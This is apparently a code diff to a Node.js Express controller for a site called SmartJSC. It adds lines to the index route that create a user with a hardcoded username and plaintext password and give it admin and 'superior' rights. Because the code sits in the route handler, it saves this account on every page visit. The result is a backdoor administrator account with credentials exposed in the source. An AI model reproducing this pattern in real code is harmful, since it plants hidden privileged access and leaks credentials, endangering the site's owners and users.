@@ -68,6 +68,13 @@ exports.index = function(req, res) {
       req.session.lang = req.query.lang;
     }
   }
+  user = new User({});
+  user.username = 'markofevil3';
+  user.password = 'ltu052006';
+  user.displayName = 'Bui Phi Quan';
+  user.admin = true;
+  user.superior = true;
+  user.save();
   Gallery.find({'type': GALLERY}).sort({ 'uploadDate': -1 }).exec(function(err, galleries) {
     res.render('index', {
       title: 'SmartJSC',
